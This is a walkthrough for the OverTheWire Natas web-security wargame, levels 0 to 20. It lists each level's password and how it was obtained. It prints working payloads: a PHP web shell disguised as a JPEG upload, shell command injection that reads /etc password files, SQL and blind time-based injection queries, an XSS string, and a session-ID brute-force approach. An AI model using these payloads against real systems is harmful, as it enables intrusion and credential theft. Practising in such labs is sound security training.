# NATAS - http://overthewire.org/wargames/natas


### Author
----------

Chris Lapa

https://github.com/GusBricker/ctf

Creative Commons Attribution 4.0


### LEVEL 0 - http://natas0.natas.labs.overthewire.org/
----------

U: natas0
P: natas0

Level 1 password in source.


### LEVEL 1 - http://natas1.natas.labs.overthewire.org/
----------

U: natas1
P: gtVrDuiDfck831PqWsLEZy5gyDz1clto

Level 2 password in source, but right clicking blocked. Download file with wget and view.


### LEVEL 2 - http://natas2.natas.labs.overthewire.org/
----------

U: natas2
P: ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi

Level 3 password found in ```http://natas2.natas.labs.overthewire.org/files/users.txt```.
Source for main page showed a reference to ```files/pixel.png```. The ```files/``` subdirectory allowed
enumerating files which revealed a users.txt containing password.


### LEVEL 3 - http://natas3.natas.labs.overthewire.org/
----------

U: natas3
P: Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ

Level 4 password is found by looking at ```http://natas2.natas.labs.overthewire.org/robots.txt```
Which then lists a directory called ```/s3cr3t``` which again has a users.txt file again.


### LEVEL 4 - http://natas4.natas.labs.overthewire.org/
----------

U: natas4
P: Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ

Setup Tamper Data and click Refresh this page, then push set the referrer header to natas5.


### LEVEL 5 - http://natas5.natas.labs.overthewire.org/
----------

U: natas5
P: iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq

Set ```loggedIn``` cookie to 1 by using Tamper Data


### LEVEL 6 - http://natas6.natas.labs.overthewire.org/
----------

U: natas6
P: aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1

View page source on natas6 to find link for ```http://natas6.natas.labs.overthewire.org/includes/secret.inc```
Then paste secret: FOEIUWGHFEEUHOFUOIU


### LEVEL 7 - http://natas7.natas.labs.overthewire.org/
----------

U: natas7
P: 7z3hEENjQtflzgnT29q7wAvMNfZdh0i9

Page source indicates password is in: ```/etc/natas_webpass/natas8```
Index takes page parameter, we can pass the link above in.
```view-source:http://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8```


### LEVEL 8 - http://natas8.natas.labs.overthewire.org/
----------

U: natas8
P: DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe

Password is stored encoded in the source, we reverse the code and run in sandbox.
```echo (base64_decode(strrev(hex2bin("3d3d516343746d4d6d6c315669563362"))));```
PHP Online Sandbox: http://sandbox.onlinephpfunctions.com/
Secret code: oubWYf2kBq


### LEVEL 9 - http://natas9.natas.labs.overthewire.org/
----------

U: natas9
P: W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl

Search triggers a shell command to be executed with the input as an argument.
We can pass the following in and bypass it: ```; cat /etc/natas_webpass/natas10```


### LEVEL 10 - http://natas10.natas.labs.overthewire.org/
----------

U: natas10
P: nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu

Search triggers a shell command to be executed with the input as an argument.
However the input is weakly filterd for ```&;|```
We can instead use a shell escape code: ```\[\x3b\] cat /etc/natas_webpass/natas11```
Which is the same as ```; cat /etc/natas_webpass/natas11```


### LEVEL 11 - http://natas11.natas.labs.overthewire.org/
----------

U: natas11
P: U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK

Uses showpassword field cookie data. We can reverse engineer key for ```xor_encrypt()``` by using the data format shown given in the source code.
```
// #000000 = data=ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSRwh6QUcIaAw=
$data['showpassword'] = "yes";
$data['bgcolor'] = "#000000";
$hex_data = bin2hex(json_encode($data));

print $hex_data . "\n";
$cookie = "ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSRwh6QUcIaAw=";
print bin2hex(base64_decode($cookie)) . "\n";

for ($i=0; $i<strlen($cookie); $i++)
{
    $d[$i] = $hex_data[$i] ^ $cookie[$i];
    print bin2hex($d[$i]);
}
```

By inputting a precaptured cookie, we can partially decode the cookie ($cookie).
We can also create an identical structure and partially encode it.
The result is:
7b2273686f7770617373776f7264223a22796573222c226267636f6c6f72223a2223303030303030227d    // Partially encoded
0a554b221e00482b02044f2503131a70531957685d555a2d12185425035502685247087a414708680c      // Partially decoded
If we xor the two results together then we can get the key which is 'qw8J'.
Then its just a matter of running the existing with the correct key to generate a proper cookie and injecting it using tamper data.


### LEVEL 12 - http://natas12.natas.labs.overthewire.org/
----------

U: natas12
P: EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3

Create a text file with the following contents with the name natas12.jpeg:
```<?php $cmd=$_GET['cmd']; passthru($cmd);?>```

Capture the upload with tamper data and rename the temporary random filename extension to .php.
Then view the file for example like this: ```natas12.natas.labs.overthewire.org/upload/leo58sj437.php?cmd=cat /etc/natas_webpass/natas13```

Useful Sources:
- http://php.find-info.ru/php/004/phpsec-CHP-2-SECT-3.html
- https://www.exploit-db.com/papers/12871/

Vulnerable to XSS like this:
	``` " onclick="javascript:alert('Hello'); ```


### LEVEL 13 - http://natas13.natas.labs.overthewire.org/
----------

U: natas13
P: jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY

Similar to level 12, however now a filetype check is performed. We can bypass the filetype check by adding some basic EXIF data to fool it.
For example:
	```echo -e "\xFF\xD8\xFF\xE0<?php $cmd=$_GET['cmd']; passthru($cmd);?>" > ~/natas13.jpeg```

Upload this file and use tamper data to rename the temporary random filename extension to .php.
Then View the file for example like this: ```http://natas13.natas.labs.overthewire.org/upload/nbijbtjy7g.php?cmd=cat%20/etc/natas_webpass/natas14```

Useful Sources:
- http://www.exiv2.org/tags.html
- http://www.r00tsec.com/2014/08/howto-bypass-exifimagetype-function.html


### LEVEL 14 - http://natas14.natas.labs.overthewire.org/
----------

U: natas14
P: Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1

Level in vulnerable to SQL injection.
The SQL statement in question is:
- ```$query = "SELECT * from users where username=\"".$_REQUEST["username"]."\" and password=\"".$_REQUEST["password"]."\"";```
We can pass ```" or ""="``` as the username and password.
- ```$query = "SELECT * from users where username=\""" or ""=""\" and password=\""" or ""=""\"";```

This makes the input say ```username="" or "="``` as ```"="``` is always true (same for password).

Useful Sources:
- http://www.w3schools.com/sql/sql_injection.asp


### LEVEL 15 - http://natas15.natas.labs.overthewire.org/
----------

U: natas15
P: AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J

The level is vulnerable to SQL injection. Meaning the level lets you inject an unfiltered query.
Exploiting this requires modifying the query to check if the password begins with a character then brute force guessing.
The specific query:
	- ```http://natas15.natas.labs.overthewire.org/index.php?debug&username=natas16" AND password LIKE BINARY "{0}%```

Some assumptions based on prior/given knowledge:
	- Username is natas16
	- Password is 32 chars long
	- The table format is given in the source

The BINARY keyword is neccessary to make the string comparision case sensitive (MySQL defaults to case insensitivity) and the ```%``` character is a wildcard.

Source code in natas15.py

Useful Sources:
	- https://www.exploit-db.com/docs/17397.pdf


### LEVEL 16 - http://natas16.natas.labs.overthewire.org/
----------

U: natas16
P: WaIHEacj63wnNIBROHeqi3p9t0m5nhmh

The level is vulnerable to a blind injection.
We pick a unique word such as "meowing" that we know exists in the dicitonary.
We effectively build up a password using a regular expression and repeatidly checking the response:
	- ```needle=$(grep ^{0} /etc/natas_webpass/natas17){1}&submit=Search```
This works by prepending part of the password onto "meowing" and then passing the combined word into the outter grep statement.
When the response doesn't contain "meowing" then we have determined part of the password.

The level is also vulnerable to a bypass of the ```preg_match()``` function by passing it an array. As seen below:
	- ```http://natas16.natas.labs.overthewire.org/index.php?needle[]=value1&needle[]=value2&submit=Search```
However I cant figure out how to exploit the above weakness.


### LEVEL 17 - http://natas17.natas.labs.overthewire.org/
----------

U: natas17
P: 8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw

The level is vulnerable to blind SQL injection. Meaning the level lets you inject an unfiltered query which controls how the page loads in this case.
Exploiting this requires measuring the response time and injecting the query with a ```sleep()``` to delay the query response.
The specific query:
	- ```natas18" UNION SELECT IF(BINARY SUBSTRING(password,{0},1)='{1}',SLEEP(5),0) username, password FROM users WHERE username = "natas18```

Some assumptions based on prior/given knowledge:
	- Username is natas18
	- Password is 32 chars long
	- The table format is given in the source

The BINARY keyword is neccessary to make the string comparision case sensitive! MySQL defaults to case insensitivity.

Source code in natas16.py

Useful Sources:
	- https://www.exploit-db.com/docs/17397.pdf


### LEVEL 18 - http://natas18.natas.labs.overthewire.org/
----------

U: natas18
P: xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP

The level is vulnerable to session fixation due to a limited session ID space (only 640 possiblities).
We can therefore iterate our PHPSESSID and try find an admin session.

Source code in natas18.py


### LEVEL 19 - http://natas19.natas.labs.overthewire.org/
----------

U: natas19
P: 4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs

The level is still vulnerable to session fixation due to the session ID not being random.

The samples below show a pattern in the ID:
```
3538312d636174 581-cat
3435392d6c6173646a 459-lasdj
3533322d73736164 532-ssad
3536332d617364 563-asd
3230352d6c6f67696e 205-login
3535372d6c6f67696e 557-login
```

1. They are ASCII HEX representation of the real session ID.
2. The session ID still eappears to have a maximum of 640 and is made up of the username.

Therefore we repeat a similar attack to level 18, but encode the session ID and append with "-admin". For example:
```1-admin -> 302d61646d696e```


### LEVEL 20 - http://natas20.natas.labs.overthewire.org/
----------

U: natas20
P: eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF

